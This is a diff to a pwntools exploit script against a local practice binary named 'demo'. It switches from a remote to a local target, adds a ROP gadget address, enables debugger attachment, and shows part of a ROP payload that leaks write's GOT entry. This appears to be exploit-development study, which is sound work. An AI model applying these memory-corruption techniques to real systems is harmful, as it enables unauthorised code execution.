@@ -6,10 +6,10 @@ from pwn import *
 #context.log_level = 'debug'
 
 # load program
-# p = process('./demo')
+p = process('./demo')
 #addr = '192.168.191.131'
 addr = "127.0.0.1"
-p = remote(addr,1234)
+#p = remote(addr,1234)
 
 # get info from ELF
 elf = ELF('demo')
@@ -53,6 +53,8 @@ mmmcall = 0x400610
 # 400634:       c3                      ret    
 ppppppr = 0x40062a
 
+p5j = 0x000000000009776f # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
+
 # junkcode
 padding = 0xdeadbeef
 
@@ -76,7 +78,7 @@ payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg
 log.info("recv[1]: " + p.recvuntil('Hello, World\n'))
 sleep(1)
 
-# gdb.attach(p)
+gdb.attach(p)
 
 p.sendline(payload1)
 log.info("## write(1, write_got, 8) -------- leak write")
